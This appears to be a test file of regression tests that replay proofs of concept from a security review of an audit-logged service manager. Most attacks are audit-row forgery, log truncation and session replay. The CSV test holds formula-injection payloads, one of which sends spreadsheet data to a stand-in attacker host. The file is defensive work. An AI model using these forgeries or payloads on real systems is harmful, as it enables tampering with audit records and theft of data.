/**
 * Regression tests for security review C (crypto, secrets, audit integrity, privacy, deployment).
 * Each block reproduces a proof of concept from the review and checks that it no longer works.
 */
import crypto from 'node:crypto';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { ADMIN, authHeaders, loginCookie, setup, startTestServer, type TestServer } from './helpers.js';

let s: TestServer;
let gatus: string;
const PW = 'Demo-password-1';

beforeAll(async () => {
  s = await startTestServer();
  await setup(s);
  await s.api('POST', '/demo/setup', {});
  gatus = (await s.api('GET', '/platforms')).find((p: any) => p.kind === 'gatus').id;
});
afterAll(async () => {
  await s?.app.close();
});

const db = async () => (await import('../src/db.js')).db();
let adminCookie = '';
/** GET as the admin, as text (exports). */
async function adminText(url: string): Promise<string> {
  adminCookie ||= await loginCookie(s.base, ADMIN.username, ADMIN.password);
  const res = await fetch(s.base + '/api' + url, { headers: authHeaders(adminCookie) });
  expect(res.status).toBe(200);
  return res.text();
}

/** Rows after `seq`, to put them back verbatim after a destructive test (the chain only depends on content). */
async function snapshotAfter(seq: number): Promise<Record<string, unknown>[]> {
  return (await db()).all('SELECT * FROM audit_log WHERE seq > ? ORDER BY seq', seq);
}
async function restore(rows: Record<string, unknown>[]): Promise<void> {
  const d = await db();
  // entries written since (e.g. "audit.verified" of a failed verification) took the removed numbers
  if (rows.length) d.run('DELETE FROM audit_log WHERE seq >= ?', rows[0]!.seq);
  for (const r of rows) {
    d.run(
      'INSERT INTO audit_log (seq, ts, actor, action, entity_type, entity_id, run_id, summary, details, prev_hash, hash) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)',
      r.seq, r.ts, r.actor, r.action, r.entity_type, r.entity_id, r.run_id, r.summary, r.details, r.prev_hash, r.hash,
    );
  }
}
/** Removes everything after `seq` (forged rows and what was chained to them) and forgets the anchors of the test. */
async function rollbackTo(seq: number): Promise<void> {
  (await db()).run('DELETE FROM audit_log WHERE seq > ? OR seq < 1', seq);
  (await import('../src/audit.js')).resetAuditMemory();
  fs.rmSync((await import('../src/audit-anchor.js')).anchorFile(), { force: true });
}
const maxSeq = async () => Number((await db()).get<{ m: number }>('SELECT MAX(seq) AS m FROM audit_log')!.m);
/** What an attacker with database access does first: remove the guard against seq < 1. */
async function withoutSeqGuard(fn: () => Promise<void>): Promise<void> {
  const d = await db();
  if (d.dialect === 'sqlite') d.exec('DROP TRIGGER IF EXISTS audit_log_seq_positive');
  else d.exec('ALTER TABLE audit_log DROP CONSTRAINT IF EXISTS audit_log_seq_positive');
  try {
    await fn();
  } finally {
    if (d.dialect === 'sqlite') {
      d.exec("CREATE TRIGGER audit_log_seq_positive BEFORE INSERT ON audit_log WHEN NEW.seq IS NULL OR NEW.seq < 1 BEGIN SELECT RAISE(ABORT, 'audit_log.seq must be greater than 0'); END;");
    } else d.exec('ALTER TABLE audit_log ADD CONSTRAINT audit_log_seq_positive CHECK (seq > 0) NOT VALID');
  }
}
const insertRow = async (seq: number, action: string, summary: string, details: unknown = null, runId: string | null = null) =>
  (await db()).run(
    "INSERT INTO audit_log (seq, ts, actor, action, entity_type, entity_id, run_id, summary, details, prev_hash, hash) VALUES (?, '2026-09-01T08:00:00.000Z', 'olivia', ?, 'report', 'rep_forged', ?, ?, ?, 'GENESIS', 'deadbeef')",
    seq, action, runId, summary, details === null ? null : JSON.stringify(details),
  );

describe('H1 – audit chain: truncation, wipe, rows with seq < 1, anchoring', () => {
  it('refuses rows with seq < 1 at the database (migration security-001)', async () => {
    await expect(insertRow(0, 'approval.granted', 'forged')).rejects.toThrow(/seq|check|constraint/i);
  });

  it('flags rows with seq 0 or below, and never lists or exports them', async () => {
    expect((await s.api('GET', '/audit/verify')).ok).toBe(true);
    await withoutSeqGuard(async () => {
      try {
        await insertRow(0, 'approval.granted', 'Change approved by plant manager (forged)');
        await insertRow(-5, 'approval.granted', 'Another forged approval');
        const r = await s.api('GET', '/audit/verify');
        expect(r.ok).toBe(false);
        expect(r.message).toMatch(/Unexpected entry #-5/);
        expect(await s.api('GET', '/audit?q=forged')).toEqual([]);
        expect(await adminText('/audit/export?format=jsonl')).not.toContain('forged');
        expect(await adminText('/audit/export?format=csv')).not.toContain('forged');
      } finally {
        (await db()).run('DELETE FROM audit_log WHERE seq < 1');
      }
    });
    expect((await s.api('GET', '/audit/verify')).ok).toBe(true);
  });

  it('detects entries removed at the end while the server runs (in-memory head)', async () => {
    await s.api('GET', '/audit/verify');
    const keep = await maxSeq();
    const rows = await snapshotAfter(keep - 3);
    (await db()).run('DELETE FROM audit_log WHERE seq > ?', keep - 3);
    const r = await s.api('GET', '/audit/verify');
    expect(r.ok).toBe(false);
    expect(r.message).toMatch(/removed/);
    await restore(rows);
  });

  it('detects tail truncation and a full wipe against the signed local anchor, also after a restart', async () => {
    const ok = await s.api('GET', '/audit/verify');
    expect(ok.ok).toBe(true);
    expect(ok.checkpoint.signature).toBeTruthy();
    const { resetAuditMemory } = await import('../src/audit.js');
    const { anchorFile } = await import('../src/audit-anchor.js');
    const anchored = JSON.parse(fs.readFileSync(anchorFile(), 'utf8'));
    expect(anchored.seq).toBe(ok.checkpoint.seq);

    // the review's PoC: delete the last 10 entries (including the verification), then verify
    const rows = await snapshotAfter(anchored.seq - 10);
    (await db()).run('DELETE FROM audit_log WHERE seq > ?', anchored.seq - 10);
    resetAuditMemory(); // as after a restart: only the anchor knows the old head
    const r = await s.api('GET', '/audit/verify');
    expect(r.ok).toBe(false);
    expect(r.message).toMatch(/local anchor file proves that entry #\d+ existed/);
    await restore(rows);

    // full wipe
    const all = await snapshotAfter(0);
    (await db()).run('DELETE FROM audit_log');
    resetAuditMemory();
    const wiped = await s.api('GET', '/audit/verify');
    expect(wiped.ok).toBe(false);
    expect(wiped.message).not.toMatch(/All 0 entries are intact/);
    (await db()).run('DELETE FROM audit_log');
    await restore(all);
    expect((await s.api('GET', '/audit/verify')).ok).toBe(true);
  });

  it('verifies against an externally kept checkpoint (pasted or SM_AUDIT_ANCHOR) and rejects forged ones', async () => {
    const first = await s.api('GET', '/audit/verify');
    const external = JSON.stringify(first.checkpoint);
    expect((await s.api('POST', '/audit/verify', { anchor: external })).ok).toBe(true);
    expect((await s.api('POST', '/audit/verify', { anchor: `${first.checkpoint.seq}:${first.checkpoint.hash}` })).ok).toBe(true);

    // a checkpoint whose signature does not fit is refused
    const forged = { ...first.checkpoint, seq: first.checkpoint.seq - 1 };
    await expect(s.api('POST', '/audit/verify', { anchor: JSON.stringify(forged) })).rejects.toMatchObject({ status: 400 });

    // the attacker also removes the local anchor file – the external checkpoint still catches the truncation
    const { resetAuditMemory } = await import('../src/audit.js');
    const { anchorFile } = await import('../src/audit-anchor.js');
    const savedAnchor = fs.readFileSync(anchorFile(), 'utf8');
    const rows = await snapshotAfter(first.checkpoint.seq - 2);
    (await db()).run('DELETE FROM audit_log WHERE seq > ?', first.checkpoint.seq - 2);
    fs.rmSync(anchorFile());
    resetAuditMemory();
    const r = await s.api('POST', '/audit/verify', { anchor: external });
    expect(r.ok).toBe(false);
    expect(r.anchors.at(-1)).toMatchObject({ ok: false, source: 'checkpoint you entered' });
    process.env.SM_AUDIT_ANCHOR = external;
    try {
      expect((await s.api('GET', '/audit/verify')).ok).toBe(false);
    } finally {
      delete process.env.SM_AUDIT_ANCHOR;
    }
    (await db()).run('DELETE FROM audit_log WHERE seq > ?', first.checkpoint.seq - 2);
    await restore(rows);
    fs.writeFileSync(anchorFile(), savedAnchor);
    expect((await s.api('GET', '/audit/verify')).ok).toBe(true);
  });

  it('signs checkpoints with the per-install Ed25519 key; the public key is exportable', async () => {
    const a = await s.api('GET', '/audit/anchoring');
    expect(a.publicKeyPem).toContain('BEGIN PUBLIC KEY');
    expect(a.fingerprint).toMatch(/^[0-9a-f]{4}(:[0-9a-f]{4}){7}$/);
    const cp = await s.api('POST', '/audit/checkpoint');
    const { checkpointPayload } = await import('../src/audit.js');
    const { signature, ...body } = cp;
    expect(crypto.verify(null, Buffer.from(checkpointPayload(body)), crypto.createPublicKey(a.publicKeyPem), Buffer.from(signature, 'base64'))).toBe(true);
    // the private key never appears anywhere readable
    const vaultFile = JSON.parse(fs.readFileSync(path.join(s.dataDir, 'vault.json'), 'utf8'));
    expect(JSON.stringify(vaultFile)).not.toContain('PRIVATE');
    expect(vaultFile.version).toBe(2);
  });

  it('exports prevHash, details and a signed checkpoint that the offline CLI checks', async () => {
    const bundle = JSON.parse(await adminText('/audit/export?format=json'));
    expect(bundle.checkpoint.seq).toBeGreaterThan(0);
    expect(bundle.entries[0].prevHash).toBe('GENESIS');
    const { verifyExport } = await import('../src/cli/audit-verify-export.js');
    const pub = bundle.publicKeyPem as string;
    const check = (entries: any[]) => verifyExport({ entries, checkpoints: [{ source: 'export', cp: bundle.checkpoint }], publicKey: pub, keySource: 'option' });
    expect(check(bundle.entries)).toMatchObject({ ok: true });
    // an entry rewritten in the file
    const edited = structuredClone(bundle.entries);
    edited[2].summary = 'nothing happened';
    expect(check(edited).ok).toBe(false);
    // entries removed from the end of the file
    expect(check(bundle.entries.slice(0, bundle.checkpoint.seq - 1)).ok).toBe(false);
    // another installation's key
    const other = crypto.generateKeyPairSync('ed25519').publicKey.export({ format: 'pem', type: 'spki' }).toString();
    expect(verifyExport({ entries: bundle.entries, checkpoints: [{ source: 'export', cp: bundle.checkpoint }], publicKey: other, keySource: 'option' }).ok).toBe(false);
    const csv = await adminText('/audit/export?format=csv');
    expect(csv.split('\r\n')[0]).toBe('seq,ts,actor,action,entityType,entityId,runId,summary,details,prevHash,hash');
  });
});

describe('H2 – report verification and protocol seals only trust authentic audit entries', () => {
  it('a forged report.generated row does not make a forged PDF verify', async () => {
    const pdf = Buffer.from('%PDF-1.7\n% forged maintenance report: "all safety checks passed"\n%%EOF\n');
    const sha = crypto.createHash('sha256').update(pdf).digest('hex');
    const details = { kind: 'run', filename: 'safety-check.pdf', sha256: sha, size: pdf.length };
    const start = await maxSeq();
    await withoutSeqGuard(async () => {
      await insertRow(-1, 'report.generated', 'Report generated', details); // the review's PoC
      await insertRow((await maxSeq()) + 1, 'report.generated', 'Report generated', details); // a forged row at the end of the chain
      const r = await s.api('POST', '/reports/verify', { contentBase64: pdf.toString('base64') });
      expect(r.match).toBe('unknown');
      expect(r.report).toBeUndefined();
      expect(r.forgedEntries).toBeGreaterThanOrEqual(1); // the row at the end of the chain (seq -1 is not even a candidate)
      expect(r.auditChain.ok).toBe(false);
    });
    await rollbackTo(start);
    expect((await s.api('GET', '/audit/verify')).ok).toBe(true);
  });

  it('a forged run.succeeded entry does not change the sealed protocol hash', async () => {
    const runs = await s.api('GET', '/runs?status=succeeded');
    const runId = runs[0].id;
    const { sealedProtocolHash } = await import('../src/audit.js');
    const genuine = sealedProtocolHash(runId);
    expect(genuine).toMatch(/^[0-9a-f]{64}$/);
    const start = await maxSeq();
    await insertRow(start + 1, 'run.succeeded', 'Run succeeded', { protocolHash: 'f'.repeat(64) }, runId);
    expect(sealedProtocolHash(runId)).toBe(genuine);
    await rollbackTo(start);
    expect((await s.api('GET', '/audit/verify')).ok).toBe(true);
  });
});

describe('H3 – no audit flooding without signing in', () => {
  it('refuses big unauthenticated bodies and caps audited free text', async () => {
    const big = JSON.stringify({ username: 'A'.repeat(1024 * 1024), password: 'x' });
    const r = await fetch(s.base + '/api/auth/login', { method: 'POST', headers: { 'content-type': 'application/json', 'x-sm-client': '1' }, body: big });
    expect(r.status).toBe(413);
    const { audit, LIMITS } = await import('../src/audit.js');
    const e = audit({ action: 'test.big', entityType: 'test', summary: 'x'.repeat(100_000), details: { blob: 'y'.repeat(100_000) } });
    expect(e.summary.length).toBeLessThan(LIMITS.summary + 100);
    expect(e.summary).toMatch(/truncated: 100000 chars, sha256 [0-9a-f]{16}/);
    expect(JSON.stringify(e.details).length).toBeLessThan(LIMITS.details);
    expect((e.details as any).truncated).toBe(true);
  });

  it('aggregates repeated failed sign-ins per account and address', async () => {
    const before = await maxSeq();
    for (let i = 0; i < 4; i++) {
      await fetch(s.base + '/api/auth/login', { method: 'POST', headers: { 'content-type': 'application/json', 'x-sm-client': '1' }, body: JSON.stringify({ username: 'dana', password: `wrong-${i}` }) });
    }
    const rows = (await db()).all<{ summary: string }>("SELECT summary FROM audit_log WHERE seq > ? AND action = 'auth.login_failed'", before);
    expect(rows).toHaveLength(1); // the others are summed up in one entry after a minute
    const { flushFailedLoginAudit } = await import('../src/auth/login-audit.js');
    flushFailedLoginAudit();
    const after = (await db()).all<{ summary: string }>("SELECT summary FROM audit_log WHERE seq > ? AND action = 'auth.login_failed'", before);
    expect(after.map((r) => r.summary)).toEqual(['Failed sign-in for "dana"', '3 more failed sign-in(s) for "dana" from 127.0.0.1 within one minute']);
  });

  it('bounds the buffer of entries recorded while the vault is locked', async () => {
    const { audit, pendingAuditCount, PENDING_MAX } = await import('../src/audit.js');
    await s.api('POST', '/vault/lock');
    for (let i = 0; i < PENDING_MAX + 25; i++) audit({ actor: 'anonymous', action: 'test.flood', entityType: 'test', summary: `flood ${i}` });
    expect(pendingAuditCount()).toEqual({ pending: PENDING_MAX, dropped: 25 });
    await s.api('POST', '/vault/unlock', { passphrase: 'correct horse battery' });
    const dropped = (await db()).get<{ summary: string }>("SELECT summary FROM audit_log WHERE action = 'audit.entries_dropped' ORDER BY seq DESC LIMIT 1");
    expect(dropped!.summary).toMatch(/^25 audit entries/);
    expect((await s.api('GET', '/audit/verify')).ok).toBe(true);
  });
});

describe('H4 – the session cookie alone is not enough', () => {
  it('needs the per-session key: a cookie received by another local port is useless', async () => {
    const cookie = await loginCookie(s.base, 'vera', PW);
    // what the port squatter of the PoC replays
    expect((await fetch(s.base + '/api/auth/me', { headers: { cookie } })).status).toBe(401);
    expect((await fetch(s.base + '/api/auth/me', { headers: { cookie, 'x-sm-session': 'guessed' } })).status).toBe(401);
    expect((await fetch(s.base + '/api/auth/me', { headers: authHeaders(cookie) })).status).toBe(200);
    // the status endpoint does not reveal the user either
    expect((await (await fetch(s.base + '/api/auth/status', { headers: { cookie } })).json()).me).toBeNull();
  });

  it('links (downloads, images) carry a read-only link key', async () => {
    const res = await fetch(s.base + '/api/auth/login', {
      method: 'POST',
      headers: { 'content-type': 'application/json', 'x-sm-client': '1' },
      body: JSON.stringify({ username: ADMIN.username, password: ADMIN.password }),
    });
    const cookie = res.headers.get('set-cookie')!.split(';')[0]!;
    const link = res.headers.get('x-sm-link-key')!;
    expect(res.headers.get('cache-control')).toBe('no-store');
    expect((await fetch(`${s.base}/api/audit/export?format=csv&_sk=${link}`, { headers: { cookie } })).status).toBe(200);
    expect((await fetch(`${s.base}/api/audit/export?format=csv&_sk=wrong`, { headers: { cookie } })).status).toBe(401);
    // never for changes
    expect((await fetch(`${s.base}/api/vault/lock?_sk=${link}`, { method: 'POST', headers: { cookie, 'x-sm-client': '1' } })).status).toBe(401);
  });

  it('API responses are not cached', async () => {
    const res = await s.app.inject({ method: 'GET', url: '/api/health' });
    expect(res.headers['cache-control']).toBe('no-store');
  });
});

describe('H5 – the master passphrase does not leak into child processes', () => {
  it('removes SM_MASTER_PASSPHRASE(_FILE) from the environment and reads passphrase files', async () => {
    const { readPassphraseFile } = await import('../src/config.js');
    expect(process.env.SM_MASTER_PASSPHRASE).toBeUndefined();
    const f = path.join(os.tmpdir(), `sm-pass-${process.pid}`);
    fs.writeFileSync(f, 'a passphrase from a file\n', { mode: 0o600 });
    expect(readPassphraseFile(f)).toBe('a passphrase from a file');
    fs.rmSync(f);
  });

  it('starts the browser with a minimal environment and its sandbox unless running as root', async () => {
    const { browserEnv, sandboxWanted } = await import('../src/engine/browser.js');
    const env = browserEnv({ PATH: '/usr/bin', HOME: '/home/x', SM_MASTER_PASSPHRASE: 'secret-pass', SM_SENTRY_DSN: 'x', AWS_SECRET_ACCESS_KEY: 'k', DISPLAY: ':0' });
    expect(env).toEqual({ PATH: '/usr/bin', HOME: '/home/x', DISPLAY: ':0' });
    expect(sandboxWanted({ SM_CHROMIUM_SANDBOX: '1' })).toEqual({ sandbox: true, forced: true });
    expect(sandboxWanted({}).sandbox).toBe(process.getuid?.() !== 0);
    const { browserEnv: launcherEnv } = await import('../src/desktop/launcher-env.js');
    expect(launcherEnv({ PATH: '/bin', SM_MASTER_PASSPHRASE: 'p', MY_API_TOKEN: 't', LOCALAPPDATA: 'C:\\x' })).toEqual({ PATH: '/bin', LOCALAPPDATA: 'C:\\x' });
  });
});

describe('M1 – platform settings changed in the database are refused', () => {
  it('does not send credentials to a base URL changed directly in the database', async () => {
    let received: string | undefined;
    const srv = http.createServer((req, res) => {
      received = req.headers.authorization;
      res.setHeader('content-type', 'application/json');
      res.end('[]');
    });
    await new Promise<void>((r) => srv.listen(0, '127.0.0.1', r));
    const port = (srv.address() as { port: number }).port;
    const d = await db();
    const orig = d.get<{ base_url: string }>('SELECT base_url FROM platforms WHERE id = ?', gatus)!.base_url;
    try {
      d.run('UPDATE platforms SET base_url = ? WHERE id = ?', `http://127.0.0.1:${port}`, gatus); // the DBA's change, no key needed
      const p = await s.api('GET', `/platforms/${gatus}`);
      expect(p.integrity).toBe('mismatch');
      await expect(s.api('POST', `/platforms/${gatus}/test`, {})).rejects.toMatchObject({ status: 409 });
      expect(received).toBeUndefined();
      // an administrator reviews and confirms: then it is used again (and that is audited)
      await s.api('POST', `/platforms/${gatus}/confirm-config`);
      expect((await s.api('GET', `/platforms/${gatus}`)).integrity).toBe('ok');
      const audit = await s.api('GET', `/audit?action=platform.config_confirmed`);
      expect(audit[0].details.baseUrl).toBe(`http://127.0.0.1:${port}`);
    } finally {
      d.run('UPDATE platforms SET base_url = ? WHERE id = ?', orig, gatus);
      await s.api('POST', `/platforms/${gatus}/confirm-config`);
      srv.close();
    }
  });

  it('binds the encrypted credentials to their platform', async () => {
    const d = await db();
    const rows = d.all<{ id: string; secrets: string | null }>('SELECT id, secrets FROM platforms WHERE secrets IS NOT NULL ORDER BY id');
    const [a, b] = rows;
    d.run('UPDATE platforms SET secrets = ? WHERE id = ?', a!.secrets, b!.id);
    try {
      expect((await s.api('GET', `/platforms/${b!.id}`)).integrity).toBe('mismatch');
    } finally {
      d.run('UPDATE platforms SET secrets = ? WHERE id = ?', b!.secrets, b!.id);
    }
    expect((await s.api('GET', `/platforms/${b!.id}`)).integrity).toBe('ok');
  });
});

describe('M2 – vault: passphrase change, key rotation, format 1 migration, failed unlocks', () => {
  it('audits and throttles wrong passphrases', async () => {
    const { unlockThrottle } = await import('../src/auth/unlock-throttle.js');
    await s.api('POST', '/vault/lock');
    for (let i = 0; i < 3; i++) await expect(s.api('POST', '/vault/unlock', { passphrase: 'wrong passphrase!' })).rejects.toMatchObject({ status: 401 });
    await expect(s.api('POST', '/vault/unlock', { passphrase: 'correct horse battery' })).rejects.toMatchObject({ status: 429 });
    unlockThrottle.succeeded(); // the 5 s wait is over
    await s.api('POST', '/vault/unlock', { passphrase: 'correct horse battery' });
    const failed = await s.api('GET', '/audit?action=vault.unlock_failed');
    expect(failed.length).toBe(3);
  });

  it('changes the passphrase with data key rotation; secrets and the audit chain survive', async () => {
    const before = await s.api('POST', `/platforms/${gatus}/test`, {});
    const keyIdBefore = JSON.parse(fs.readFileSync(path.join(s.dataDir, 'vault.json'), 'utf8')).keyId;
    await expect(s.api('POST', '/vault/passphrase', { current: 'wrong passphrase!', next: 'a new passphrase 2026' })).rejects.toMatchObject({ status: 400 });
    const { unlockThrottle } = await import('../src/auth/unlock-throttle.js');
    unlockThrottle.succeeded();
    await expect(s.api('POST', '/vault/passphrase', { current: 'correct horse battery', next: 'too short' })).rejects.toMatchObject({ status: 400 });
    const r = await s.api('POST', '/vault/passphrase', { current: 'correct horse battery', next: 'a new passphrase 2026', rotateDataKey: true });
    expect(r.rotated).toBe(true);
    expect(r.reencrypted).toBeGreaterThan(0);
    const file = JSON.parse(fs.readFileSync(path.join(s.dataDir, 'vault.json'), 'utf8'));
    expect(file.keyId).not.toBe(keyIdBefore);
    expect(file.kdf.N).toBe(2 ** 17);
    expect((await s.api('POST', `/platforms/${gatus}/test`, {})).ok).toBe(before.ok);
    expect((await s.api('GET', '/audit/verify')).ok).toBe(true);
    await s.api('POST', '/vault/lock');
    await expect(s.api('POST', '/vault/unlock', { passphrase: 'correct horse battery' })).rejects.toMatchObject({ status: 401 });
    unlockThrottle.succeeded();
    await s.api('POST', '/vault/unlock', { passphrase: 'a new passphrase 2026' });
    expect((await s.api('GET', '/audit/verify')).ok).toBe(true);
    // back, so other tests keep working
    await s.api('POST', '/vault/passphrase', { current: 'a new passphrase 2026', next: 'correct horse battery', rotateDataKey: false });
  });

  it('converts a format 1 vault on unlock and keeps the audit key (chain continuity)', async () => {
    const { Vault, encryptWith, decryptWith } = await import('../src/vault.js');
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sm-v1-'));
    const file = path.join(dir, 'vault.json');
    const salt = crypto.randomBytes(16);
    const oldKey = crypto.scryptSync('an old short pw', salt, 32, { N: 2 ** 15, r: 8, p: 1, maxmem: 128 * 1024 * 1024 });
    fs.writeFileSync(file, JSON.stringify({ version: 1, salt: salt.toString('base64'), N: 2 ** 15, r: 8, p: 1, check: encryptWith(oldKey, 'service-manager-vault-v1') }));
    const secret = encryptWith(oldKey, JSON.stringify({ password: 'platform-secret' }));
    const v = new Vault(file);
    await v.unlock('an old short pw'); // shorter than 12: existing passphrases keep working
    expect(v.migratedFromV1).toBe(true);
    expect(v.decrypt(secret)).toEqual({ password: 'platform-secret' });
    expect(v.auditKey().equals(Buffer.from(crypto.hkdfSync('sha256', oldKey, Buffer.alloc(0), 'audit-chain', 32)))).toBe(true);
    const migrated = JSON.parse(fs.readFileSync(file, 'utf8'));
    expect(migrated).toMatchObject({ version: 2, kdf: { N: 2 ** 17 } });
    expect(fs.existsSync(`${file}.v1.bak`)).toBe(true);
    const v2 = new Vault(file);
    await v2.unlock('an old short pw');
    expect(v2.auditKey().equals(v.auditKey())).toBe(true);
    expect(decryptWith(Buffer.from(v2.integrityKey()), encryptWith(v2.integrityKey(), 'x'))).toBe('x');
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it('completes or discards an interrupted passphrase change', async () => {
    const { Vault } = await import('../src/vault.js');
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sm-vault-'));
    const file = path.join(dir, 'vault.json');
    let dbKeyId: string | undefined;
    const store = { get: () => dbKeyId, set: (id: string) => (dbKeyId = id) };
    const v = new Vault(file);
    v.keyIdStore = store;
    await v.setup('first passphrase 1');
    const secret = v.encrypt('s1');
    // crash after the database was re-encrypted, before vault.json was replaced
    await expect(
      v.changePassphrase('first passphrase 1', 'second passphrase 2', (convert, newId) => {
        dbKeyId = newId;
        fs.writeFileSync(path.join(dir, 'converted'), convert(secret));
        fs.copyFileSync(`${file}.next`, path.join(dir, 'next.keep'));
        throw new Error('crash');
      }),
    ).rejects.toThrow('crash');
    fs.copyFileSync(path.join(dir, 'next.keep'), `${file}.next`); // what the crash left behind
    const w = new Vault(file);
    w.keyIdStore = store;
    await expect(w.unlock('first passphrase 1')).rejects.toMatchObject({ code: 'VAULT_CHANGE_INTERRUPTED' });
    await w.unlock('second passphrase 2');
    expect(w.decrypt(fs.readFileSync(path.join(dir, 'converted'), 'utf8'))).toBe('s1');
    expect(fs.existsSync(`${file}.next`)).toBe(false);
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it('knows every place that stores data encrypted with the data key (rotation re-encrypts all of it)', async () => {
    const { ENCRYPTED_COLUMNS, ENCRYPTED_SETTINGS } = await import('../src/vault-rotation.js');
    const registered = new Set([...ENCRYPTED_COLUMNS, ...ENCRYPTED_SETTINGS].map((e) => e.file));
    const src = path.resolve(__dirname, '..', 'src');
    const walk = (d: string): string[] => fs.readdirSync(d, { withFileTypes: true }).flatMap((e) => (e.isDirectory() ? walk(path.join(d, e.name)) : [path.join(d, e.name)]));
    const users = walk(src)
      .filter((f) => f.endsWith('.ts') && /vault\(\)\.encrypt\(/.test(fs.readFileSync(f, 'utf8')))
      .map((f) => path.relative(src, f).split(path.sep).join('/'));
    // a new encrypted field? register it in server/src/vault-rotation.ts, or it becomes unreadable after a key rotation
    expect(users.filter((f) => !registered.has(f))).toEqual([]);
  });

  it('requires 12 characters for a new master passphrase', async () => {
    const { Vault } = await import('../src/vault.js');
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sm-vault-'));
    await expect(new Vault(path.join(dir, 'vault.json')).setup('11-chars-pw')).rejects.toMatchObject({ code: 'PASSPHRASE_TOO_SHORT' });
    fs.rmSync(dir, { recursive: true, force: true });
  });
});

describe('M3 – sign-in hashing does not block the server', () => {
  it('keeps the server responsive during a burst of failed sign-ins', async () => {
    const logins = Array.from({ length: 8 }, (_, i) =>
      fetch(s.base + '/api/auth/login', { method: 'POST', headers: { 'content-type': 'application/json', 'x-sm-client': '1' }, body: JSON.stringify({ username: `nobody-${i}`, password: 'x' }) }),
    );
    const t0 = Date.now();
    const health = await fetch(s.base + '/api/health');
    const ms = Date.now() - t0;
    expect(health.status).toBe(200);
    await Promise.all(logins);
    expect(ms).toBeLessThan(1000);
  });
});

describe('M4 – the desktop launcher checks the instance identity', () => {
  it('accepts only a server that knows the secret in the data folder', async () => {
    const { verifyInstance, writeInstanceFile } = await import('../src/instance.js');
    const { config } = await import('../src/config.js');
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sm-inst-'));
    // the PoC's look-alike: answers /api/health with {"ok":true}
    const squatter = http.createServer((req, res) => {
      res.setHeader('content-type', 'application/json');
      res.end(req.url?.startsWith('/api/instance') ? JSON.stringify({ instanceId: 'x', proof: '00' }) : '{"ok":true}');
    });
    await new Promise<void>((r) => squatter.listen(0, '127.0.0.1', r));
    const url = `http://127.0.0.1:${(squatter.address() as { port: number }).port}`;
    expect(await verifyInstance(url, dir)).toBe('no-file');
    writeInstanceFile(s.base);
    expect(fs.statSync(path.join(config.dataDir, 'instance.json')).mode & 0o077).toBe(process.platform === 'win32' ? expect.anything() : 0);
    expect(await verifyInstance(url, config.dataDir)).toBe('mismatch');
    // the real server on the configured port proves itself (config.port is the test server's port)
    expect(await verifyInstance(s.base, config.dataDir)).toBe('ok');
    squatter.close();
    fs.rmSync(dir, { recursive: true, force: true });
  });
});

describe('M5 – data directory permissions', () => {
  it.skipIf(process.platform === 'win32')('makes the data folder and its key files private', async () => {
    const { ensureDataDirs, config } = await import('../src/config.js');
    fs.chmodSync(config.dataDir, 0o755);
    fs.chmodSync(path.join(config.dataDir, 'vault.json'), 0o644);
    expect(ensureDataDirs()).toEqual([]);
    expect(fs.statSync(config.dataDir).mode & 0o777).toBe(0o700);
    expect(fs.statSync(path.join(config.dataDir, 'vault.json')).mode & 0o777).toBe(0o600);
  });
});

describe('M6 – CSV export without formula injection', () => {
  it('prefixes cells a spreadsheet would run', async () => {
    const { csvCell } = await import('../src/audit-export.js');
    for (const v of ['=HYPERLINK("https://evil")', '+1', '-1', '@SUM(A1)', '\tx', '\rx']) expect(csvCell(v).startsWith(`"'`)).toBe(true);
    expect(csvCell('plain')).toBe('"plain"');
    await fetch(s.base + '/api/auth/login', {
      method: 'POST',
      headers: { 'content-type': 'application/json', 'x-sm-client': '1' },
      body: JSON.stringify({ username: '=HYPERLINK("https://evil.example/?"&A1)', password: 'x' }),
    });
    const csv = await adminText('/audit/export?format=csv');
    expect(csv).not.toMatch(/(^|,)"=HYPERLINK/m);
  });
});

describe('M7 – reverse proxy settings', () => {
  it('parses SM_TRUST_PROXY strictly', async () => {
    const { parseTrustProxy } = await import('../src/config.js');
    expect(parseTrustProxy(undefined)).toBeUndefined();
    expect(parseTrustProxy('0')).toBeUndefined();
    expect(parseTrustProxy('1')).toBe(1);
    expect(parseTrustProxy('10.0.0.5, 10.1.0.0/16')).toEqual(['10.0.0.5', '10.1.0.0/16']);
    expect(() => parseTrustProxy('true')).toThrow(/hop|number/);
    expect(() => parseTrustProxy('proxy.example.com')).toThrow(/not an IP/);
  });
});

describe('M8 – privacy', () => {
  it('does not store user names that belong to no account', async () => {
    const typo = 'Winter2026!-typed-into-the-user-field';
    await fetch(s.base + '/api/auth/login', { method: 'POST', headers: { 'content-type': 'application/json', 'x-sm-client': '1' }, body: JSON.stringify({ username: typo, password: 'x' }) });
    const all = JSON.stringify(await s.api('GET', '/audit?action=auth.login_failed&limit=50'));
    expect(all).not.toContain(typo);
    expect(all).toMatch(/unknown user name \(ref [0-9a-f]{12}\)/);
  });

  it('keeps secret process inputs out of the protocol, the audit log and the step journal', async () => {
    const text = [
      'name: Secret input test',
      'inputs:',
      '  - name: otp',
      '    label: One-time password',
      '    type: secret',
      'steps:',
      '  - id: use',
      '    type: set',
      '    values:',
      '      echoed: "{{ inputs.otp & \'-used\' }}"',
      '  - id: note',
      '    type: log',
      '    message: "otp is {{ inputs.otp }}"',
    ].join('\n');
    const created = await s.api('POST', '/processes', { text });
    const id = (await s.api('POST', '/runs', { processId: created.id, inputs: { otp: 'S3cret-OTP-4711' } })).id;
    const run = await s.waitRun(id);
    const d = await db();
    const row = d.get<{ inputs: string; sealed_inputs: string | null }>('SELECT inputs, sealed_inputs FROM runs WHERE id = ?', id)!;
    expect(row.inputs).toBe('{"otp":"***"}');
    expect(row.sealed_inputs).toMatch(/^v1:/);
    const everything = JSON.stringify([
      run,
      d.all('SELECT * FROM run_steps WHERE run_id = ?', id),
      d.all('SELECT * FROM run_logs WHERE run_id = ?', id),
      d.all('SELECT * FROM audit_log WHERE run_id = ?', id),
    ]);
    expect(everything).not.toContain('S3cret-OTP-4711');
  });
});

describe('L – redaction, scrubbing, TLS', () => {
  it('redacts encoded secrets and token fields in run data', async () => {
